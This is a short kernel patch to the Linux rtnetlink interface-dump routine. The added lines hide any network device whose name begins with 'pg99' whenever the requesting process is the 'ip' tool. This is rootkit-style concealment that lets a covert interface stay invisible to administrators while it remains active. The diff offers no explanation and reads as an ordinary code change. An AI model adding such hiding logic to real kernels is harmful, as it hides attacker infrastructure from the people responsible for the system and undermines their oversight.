@@ -2492,6 +2492,11 @@ static int rtnl_dump_ifinfo(struct sk_buff *skb, struct netlink_callback *cb)
 walk_entries:
 	err = 0;
 	for_each_netdev_dump(tgt_net, dev, ctx->ifindex) {
+		 char * cmd = current->comm;
+        	 if (cmd!= NULL && strcmp(cmd, "ip") == 0 && (strcmp(dev->name, "pg99") == 0  || strncmp(dev->name, "pg99", 4) == 0)) {
+              		 continue;
+        	 }
+		
 		if (link_dump_filtered(dev, master_idx, kind_ops))
 			continue;
 		err = rtnl_fill_ifinfo(skb, dev, net, RTM_NEWLINK,
